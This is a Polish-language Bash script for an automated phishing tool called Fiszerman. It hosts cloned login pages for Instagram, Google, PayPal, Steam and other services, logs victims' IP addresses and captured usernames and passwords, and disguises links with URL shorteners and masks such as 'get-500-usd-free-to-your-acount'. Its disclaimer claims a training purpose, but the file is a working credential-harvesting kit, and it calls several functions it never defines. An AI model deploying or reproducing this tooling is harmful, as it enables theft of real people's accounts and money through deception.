#!/bin/bash

##   Fiszerman 	: 	Automated Phishing Tool
##   Autor  	: 	Remo Faller (Sztuczka-Magiczka) 
##   Github 	: 	https://github.com/Sztuczka-Magiczka/Fiszerman


##
##      Copyright (C) 2023  Sztuczka-Magiczka (https://github.com/Sztuczka-Magiczka)
##


__version__="1.0.2"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Narzędzie Przerwane." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Narzędzie Zatrzymane." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Status Sieci : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE}       ____                                        
        ${ORANGE}      |  _| (_)___ _______ _ __ _ __ ___   __ _ _ __  
        ${ORANGE}      | |_  | / __|_  / _ \ '__| '_ ` _ \ / _` | '_ \ 
        ${ORANGE}      |  _| | \__ \/ /  __/ |  | | | | | | (_| | | | |
        ${ORANGE}      |_|   |_|___/___\___|_|  |_| |_| |_|\__,_|_| |_|  ${RED}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Inspired by Creativity. Created by Remo Faller${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
	    ${ORANGE}       ____
	    ${ORANGE}      |  _| (_)___ _______ _ __ _ __ ___   __ _ _ __  
        ${ORANGE}      | |_  | / __|_  / _ \ '__| '_ ` _ \ / _` | '_ \ 
        ${ORANGE}      |  _| | \__ \/ /  __/ |  | | | | | | (_| | | | |
        ${ORANGE}      |_|   |_|___/___\___|_|  |_| |_| |_|\__,_|_| |_| ${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie wymaganych pakietów..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pakiety są już zainstalowane."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalowanie pakietu : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Niewspierany menadżer pakietów. Zainstaluj pakiety manualnie."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Wystąpił błąd podczas pobierania ${output}."
		{ reset_color; exit 1; }
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Dziękuję za wybranie narzędzia Fiszerman.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Autor   ${RED}:  ${ORANGE}Remo Faller ${RED}[ ${ORANGE}Sztuczka-Magiczka ${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Sztuczka-Magiczka
		${GREEN} Wersja  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Uwaga:${RESETBG}
		${CYAN}  Narzędzie te służy wyłącznie do testowania, ćwiczeń oraz szkoleń.
		  only ${RED}!${WHITE}${CYAN} Autor nie ponosi odpowiedzialności za wykorzystanie narzędzia w innych celach ${RED}!${WHITE}
		
		${RED}[${WHITE}00${RED}]${ORANGE} Menu Główne     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz Opcję : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Powrót do menu głównego..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowa Opcja, Spróbuj Ponownie..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Czy Chcesz Zmienić Domyślny Port? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Wpisz Własny 4-cyfrowy Numer Portu [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowy Numer Portu : $CU_P, Spróbuj Ponownie...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Wykorzystanie Domyślnego Portu $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Przygotowywanie serwera..."${WHITE}
	cp -rf .strony/"$website"/* .server/www
	cp -f .strony/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Uruchamianie serwera PHP..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP Użytkowników : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Zapisano w : ${ORANGE}crack/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Loginy:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Hasła:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Loginy : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hasła : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Zapisano w : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Oczekiwanie Na Kolejny Przechwyt, ${BLUE}Ctrl + C ${ORANGE}aby zakończyć. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Oczekiwanie Na Kolejny Przechwyt, ${BLUE}Ctrl + C ${ORANGE}aby zakończyć..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP Użytkownika Przechwycone !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Dane Logowanie Przechwycone !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicjalizacja... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hostowana z adresu : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz usługę Port Forwarding : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowa Opcja, Spróbuj Ponownie..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Custom Mask URL
custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Czy chcesz zmienić maskowanie adresu URL? ${GREEN}[${CYAN}t${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
	echo
	if [[ ${mask_op,,} == "t" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Wpisz swój adres URL ${CYAN}(${ORANGE}Przykład: https://get-free-followers.com${CYAN})\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Używanie losowego adresu URL :${GREEN} $mask"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Nieprawidłowy typ URL..Używanie domyślnego.."
		fi
	fi
}

## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		# echo "[!] No url provided / Regex Not Matched"
		url="Nie można wygenerować linku. Spróbuj zresetować hotspot"
		processed_url="Nie można skrócić adresu URL"
	fi

	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
	[[ $processed_url != *"Nie można"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Instagram Login 
    EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz Opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowa Opcja, Spróbuj Ponownie..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Google
site_google() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Google Login
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowa Opcja, Spróbuj Ponownie..."
			{ sleep 1; clear; banner_small; site_google; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Wybierz rodzaj przynęty ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Instagram     
		${RED}[${WHITE}02${RED}]${ORANGE} Google       
		${RED}[${WHITE}03${RED}]${ORANGE} Microsoft     	
		${RED}[${WHITE}04${RED}]${ORANGE} Ebay       	
		${RED}[${WHITE}05${RED}]${ORANGE} Paypal        
		${RED}[${WHITE}06${RED}]${ORANGE} Steam         		
		${RED}[${WHITE}07${RED}]${ORANGE} Playstation   
		
		${RED}[${WHITE}99${RED}]${ORANGE} Informacje         ${RED}[${WHITE}00${RED}]${ORANGE} Wyjście

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Wybierz opcję : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			tunnel_menu;;
		2 | 02)
			website="google"
			tunnel_menu;;
		3 | 03)
			website="microsoft"
			tunnel_menu;;
		4 | 04)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		5 | 05)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		6 | 06)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		7 | 07)
			website="playstation"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Nieprawidłowa Opcja, Spróbuj Ponownie..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
